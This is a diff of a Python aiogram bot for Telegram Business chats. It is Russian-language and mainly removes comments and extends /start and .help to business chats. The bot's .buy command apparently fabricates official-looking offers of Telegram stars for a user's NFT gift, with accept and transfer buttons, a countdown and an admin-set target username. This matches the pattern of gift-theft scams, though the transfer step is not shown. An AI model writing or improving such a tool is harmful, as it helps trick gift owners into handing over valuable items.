@@ -18,18 +18,15 @@ from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
 BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН")
-ADMIN_ID = int(os.getenv("ADMIN_ID", 123456789)) # Ваш ID
+ADMIN_ID = int(os.getenv("ADMIN_ID", 123456789))
 WEBHOOK_HOST = os.getenv("RENDER_EXTERNAL_URL", "")
 WEBHOOK_PATH = "/webhook"
 WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"
 PORT = int(os.getenv("PORT", 8080))
 DB_NAME = "bot_database.db"
 
-# Словарь для хранения активных предложений в памяти {message_id: nft_name}
-# В реальном проекте лучше хранить в БД, но для базовой работы хватит и словаря
 active_offers = {}
 
-# --- ЛОКАЛИЗАЦИЯ (i18n) ---
 LOCALES = {
     "ru": {
         "offer": "Пользователь <b>{giver}</b> предлагает\nВам <b>{amount}</b> {star} звёзд за подарок\n<b>{link_html}</b>.\n\nПредложение действует ещё 6ч.",
@@ -72,7 +69,6 @@ LOCALES = {
     }
 }
 
-# Словарь эмодзи по умолчанию
 DEFAULT_EMOJIS = {
     "star": ["⭐", None], "gift": ["🎁", None], "decline": ["❌", None], "accept": ["✅", None],
     "transfer": ["➡️", None], "how_to": ["❓", None], "confirm": ["✅", None], "help_doc": ["📄", None],
@@ -99,7 +95,6 @@ async def set_setting(key: str, value: str):
         await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
         await db.commit()
 
-# --- ХЕЛПЕРЫ ДЛЯ ЭМОДЗИ ---
 async def get_emoji_id(key: str):
     async with aiosqlite.connect(DB_NAME) as db:
         async with db.execute("SELECT emoji_id FROM emojis WHERE key = ?", (key,)) as cursor:
@@ -126,7 +121,7 @@ class AdminStates(StatesGroup):
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 router = Router()
-dp.include_router(router)
+dp.include_router(router)  # <--- ОЧЕНЬ ВАЖНО! БЕЗ ЭТОЙ СТРОКИ БОТ НЕ БУДЕТ ВИДЕТЬ КОМАНДЫ
 
 # --- ГЕНЕРАТОРЫ КЛАВИАТУР ---
 async def get_offer_keyboard(lang: str):
@@ -162,19 +157,17 @@ def get_admin_keyboard():
         [InlineKeyboardButton(text="Создать шаблон (.shab)", callback_data="admin_create_tpl")]
     ])
 
-# --- ОБРАБОТЧИКИ БИЗНЕС-ЧАТОВ ---
+# --- ОБРАБОТЧИКИ КОМАНД ---
 
+# Команда /start (работает и в ЛС, и в бизнес-чатах)
 @router.message(Command("start"))
+@router.business_message(Command("start"))
 async def cmd_start(message: Message):
-    await message.answer(
-        f"👋 Привет, {message.from_user.full_name}!\n\n"
-        "Этот бот работает в режиме Telegram Business.\n"
-        "Подключите его в настройках своего аккаунта Telegram (Telegram Business -> Чат-боты), "
-        "чтобы он мог отвечать на команды `.buy` и `.help` в ваших чатах.\n\n"
-        "Для владельца бота доступна команда /admin."
-    )
+    await message.answer("👋 <b>Бот запущен и готов к работе!</b>\n\nДля получения инструкции введите <code>.help</code>")
 
+# Команда .help (работает и в ЛС, и в бизнес-чатах)
 @router.message(F.text == ".help")
+@router.business_message(F.text == ".help")
 async def show_help(message: Message):
     e_doc = await get_emoji_text("help_doc")
     e_ru = await get_emoji_text("ru_flag")
@@ -203,10 +196,7 @@ async def show_help(message: Message):
         "Или используйте шаблон:\n"
         "<code>.shab [номер]</code>"
     )
-    if message.business_connection_id:
-        await message.reply(text)
-    else:
-        await message.answer(text)
+    await message.answer(text) # answer работает и в бизнес-чатах (отправляет от вашего имени)
 
 @router.business_message(F.text.startswith(".buy"))
 async def process_buy_command(message: Message):
@@ -216,26 +206,21 @@ async def process_buy_command(message: Message):
         return
     
     lang, link, amount, currency = args[1].lower(), args[2], args[3], args[4]
-    
     if lang not in LOCALES:
-        lang = "ru" # Дефолтный язык, если указан неверный
+        lang = "ru"
 
-    # Извлекаем красивое имя из ссылки (BowTie #51908)
     nft_name = link.split("/")[-1].replace("-", " #") if "/" in link else "NFT"
     link_html = f'<a href="{link}">{nft_name}</a>'
     
-    # Сохраняем имя NFT в память для дальнейших кнопок
     active_offers[message.message_id] = nft_name
     
     e_star = await get_emoji_text("star")
     giver_username = message.from_user.username or message.from_user.first_name
     
-    # Формируем текст на нужном языке
     text = LOCALES[lang]['offer'].format(
         giver=giver_username, amount=amount, star=e_star, link_html=link_html
     )
     
-    # Превью ссылки наверху сообщения
     link_preview = LinkPreviewOptions(url=link, show_above_text=True)
     
     await message.reply(text, reply_markup=await get_offer_keyboard(lang), link_preview_options=link_preview)
@@ -245,7 +230,6 @@ async def process_buy_command(message: Message):
         pass
 
 # --- ОБРАБОТЧИКИ КНОПОК ---
-
 @router.callback_query(F.data.startswith("decline:"))
 async def decline_offer(callback: CallbackQuery):
     lang = callback.data.split(":")[1]
@@ -255,7 +239,6 @@ async def decline_offer(callback: CallbackQuery):
 @router.callback_query(F.data.startswith("accept:"))
 async def accept_offer(callback: CallbackQuery):
     lang = callback.data.split(":")[1]
-    
     await callback.answer(LOCALES[lang]['accept_alert'], show_alert=True)
     
     nft_name = active_offers.get(callback.message.message_id, "NFT")
@@ -301,7 +284,6 @@ async def process_username(message: Message, state: FSMContext):
     await message.answer(f"✅ Юзернейм изменен на @{message.text}")
     await state.clear()
 
-# --- УПРАВЛЕНИЕ ЭМОДЗИ ---
 @router.callback_query(F.data == "admin_emojis", F.from_user.id == ADMIN_ID)
 async def admin_emojis_menu(callback: CallbackQuery):
     kb = []
@@ -362,7 +344,6 @@ async def process_emoji_id(message: Message, state: FSMContext):
 async def admin_back(callback: CallbackQuery):
     await callback.message.edit_text("👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())
 
-# --- ШАБЛОНЫ ---
 @router.callback_query(F.data == "admin_create_tpl", F.from_user.id == ADMIN_ID)
 async def admin_create_tpl(callback: CallbackQuery, state: FSMContext):
     await callback.message.answer("Введите текст шаблона (можно использовать HTML):")
